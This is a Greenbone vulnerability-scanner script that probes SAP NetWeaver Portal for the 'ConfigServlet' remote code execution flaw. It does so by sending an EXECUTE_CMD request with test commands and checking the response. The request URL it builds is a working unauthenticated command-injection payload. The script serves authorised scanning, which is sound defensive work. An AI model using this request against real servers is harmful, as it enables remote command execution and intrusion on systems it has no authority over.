require("plugin_feed_info.inc.sc");
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103700" );
	script_version( "2021-04-26T13:10:02+0000" );
	script_tag( name: "cvss_base", value: "9.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-26 13:10:02 +0000 (Mon, 26 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-04-18 16:24:58 +0200 (Thu, 18 Apr 2013)" );
	script_name( "SAP NetWeaver Portal 'ConfigServlet' RCE Vulnerability (1503579, 1616259)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "gb_sap_netweaver_as_java_http_detect.sc", "os_detection.sc" );
	if(FEED_NAME == "GSF" || FEED_NAME == "SCM"){
		script_dependencies( "gsf/gb_sap_netweaver_portal_http_detect.sc", "gsf/gb_sap_netweaver_as_http_detect.sc" );
	}
	script_mandatory_keys( "sap/netweaver/as/http/detected" );
	script_xref( name: "URL", value: "https://erpscan.io/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/24963/" );
	script_xref( name: "URL", value: "https://launchpad.support.sap.com/#/notes/1503579" );
	script_xref( name: "URL", value: "https://launchpad.support.sap.com/#/notes/1616259" );
	script_tag( name: "summary", value: "SAP NetWeaver Portal is prone to a remote code execution (RCE)
  vulnerability." );
	script_tag( name: "impact", value: "Successfully exploiting these issues may allow an attacker to
  execute arbitrary code with the privileges of the user running the affected application." );
	script_tag( name: "solution", value: "See the referenced vendor advisories for a solution." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
if( FEED_NAME == "GSF" || FEED_NAME == "SCM" ){
	cpe_list = make_list( "cpe:/a:sap:netweaver_portal",
		 "cpe:/a:sap:netweaver_application_server_java",
		 "cpe:/a:sap:netweaver_as" );
	if(!infos = get_app_port_from_list( cpe_list: cpe_list, service: "www", first_cpe_only: TRUE )){
		exit( 0 );
	}
	port = infos["port"];
	cpe = infos["cpe"];
	if(!dir = get_app_location( cpe: cpe, port: port )){
		exit( 0 );
	}
	if(dir == "/" || IsMatchRegexp( dir, "^[0-9]+/tcp$" )){
		dir = "";
	}
}
else {
	port = http_get_port( default: 80 );
	banner = http_get_remote_headers( port: port );
	if(!banner || !IsMatchRegexp( banner, "server\\s*:\\s*sap " )){
		exit( 0 );
	}
	dir = "";
}
commands = exploit_commands();
for cmd in keys( commands ) {
	url = dir + "/ctc/servlet/ConfigServlet/?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=" + commands[cmd];
	if(buf = http_vuln_check( port: port, url: url, pattern: cmd )){
		report = "The Scanner was able to execute the command \"" + commands[cmd] + "\" on the remote host by\nrequesting the url\n\n" + url + "\n\nwhich produced the following response:\n<response>\n" + buf + "</response>";
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

